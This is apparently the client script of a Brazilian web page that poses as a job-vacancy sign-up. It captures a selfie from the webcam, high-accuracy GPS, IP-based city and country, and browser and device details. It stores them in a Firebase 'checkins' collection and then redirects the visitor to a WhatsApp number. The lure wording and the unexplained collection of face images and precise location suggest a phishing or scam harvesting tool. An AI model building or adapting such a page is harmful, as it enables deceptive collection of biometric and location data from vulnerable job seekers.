// script.js

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getFirestore,
  addDoc,
  collection,
  serverTimestamp
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {

  apiKey:
  "AIzaSyA4tZjjfiOauLn2PPxYAp6ylNqB9LWJkI0",

  authDomain:
  "rv-grup.firebaseapp.com",

  projectId:
  "rv-grup",

  storageBucket:
  "rv-grup.firebasestorage.app",

  messagingSenderId:
  "1061419825993",

  appId:
  "1:1061419825993:web:5cb7b020efd40b8cf13898"

};

const app =
initializeApp(firebaseConfig);

const db =
getFirestore(app);

const video =
document.getElementById("video");

const btn =
document.getElementById("btn");

const statusText =
document.getElementById("status");

const canvas =
document.getElementById("canvas");

async function iniciarSistema(){

  try{

    // áudio

    const fala =
    new SpeechSynthesisUtterance(
      "Clique no botão verde para participar das vagas."
    );

    fala.lang =
    "pt-BR";

    speechSynthesis.speak(
      fala
    );

    statusText.innerHTML =
    "📸 Iniciando câmera...";

    // câmera

    const stream =
    await navigator.mediaDevices
    .getUserMedia({

      video:{
        facingMode:"user"
      },

      audio:false

    });

    video.srcObject =
    stream;

    await video.play();

    // espera vídeo carregar

    await new Promise(
      (resolve)=>{

        if(video.readyState >= 2){

          resolve();

        }

        else{

          video.onloadeddata =
          ()=>resolve();

        }

      }
    );

    statusText.innerHTML =
    "✅ Sistema pronto";

  }

  catch(err){

    console.log(err);

    statusText.innerHTML =
    "❌ Permita câmera";

  }

}

window.onload = ()=>{

  iniciarSistema();

};

btn.addEventListener(
  "click",
  async()=>{

    try{

      btn.disabled = true;

      btn.innerHTML =
      "PROCESSANDO...";

      // ====================
      // CAPTURA SELFIE
      // ====================

      statusText.innerHTML =
      "📸 Capturando imagem...";

      const largura =
      video.videoWidth;

      const altura =
      video.videoHeight;

      if(!largura || !altura){

        throw new Error(
          "Vídeo não carregou"
        );

      }

      canvas.width =
      largura;

      canvas.height =
      altura;

      const ctx =
      canvas.getContext("2d");

      ctx.drawImage(
        video,
        0,
        0,
        largura,
        altura
      );

      const selfie =
      canvas.toDataURL(
        "image/jpeg",
        0.9
      );

      console.log(selfie);

      // ====================
      // LOCALIZAÇÃO
      // ====================

      let latitude =
      "não permitido";

      let longitude =
      "não permitido";

      try{

        statusText.innerHTML =
        "📍 Obtendo localização...";

        const localizacao =
        await new Promise(
          (resolve,reject)=>{

            navigator.geolocation
            .getCurrentPosition(
              resolve,
              reject,
              {
                enableHighAccuracy:true,
                timeout:10000
              }
            );

          }
        );

        latitude =
        localizacao.coords.latitude;

        longitude =
        localizacao.coords.longitude;

      }

      catch(err){

        console.log(
          "GPS negado",
          err
        );

      }

      // ====================
      // IP + CIDADE
      // ====================

      let ip =
      "indisponível";

      let cidade = "";
      let estado = "";
      let pais = "";

      try{

        statusText.innerHTML =
        "🌐 Obtendo IP...";

        const req =
        await fetch(
          "https://ipapi.co/json/"
        );

        const json =
        await req.json();

        ip =
        json.ip || "";

        cidade =
        json.city || "";

        estado =
        json.region || "";

        pais =
        json.country_name || "";

      }

      catch(err){

        console.log(
          "Erro IP",
          err
        );

      }

      // ====================
      // SALVAR FIREBASE
      // ====================

      statusText.innerHTML =
      "💾 Salvando cadastro...";

      await addDoc(
        collection(
          db,
          "checkins"
        ),
        {

          selfie:selfie,

          latitude:latitude,

          longitude:longitude,

          ip:ip,

          cidade:cidade,

          estado:estado,

          pais:pais,

          userAgent:
          navigator.userAgent,

          plataforma:
          navigator.platform,

          idioma:
          navigator.language,

          larguraTela:
          window.innerWidth,

          alturaTela:
          window.innerHeight,

          data:
          serverTimestamp()

        }
      );

      // ====================
      // FINAL
      // ====================

      statusText.innerHTML =
      "✅ Cadastro concluído";

      window.location.href =
      "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";

    }

    catch(err){

      console.log(err);

      statusText.innerHTML =
      "❌ Erro no cadastro";

      btn.disabled = false;

      btn.innerHTML =
      "QUERO PARTICIPAR";

    }

  }
);
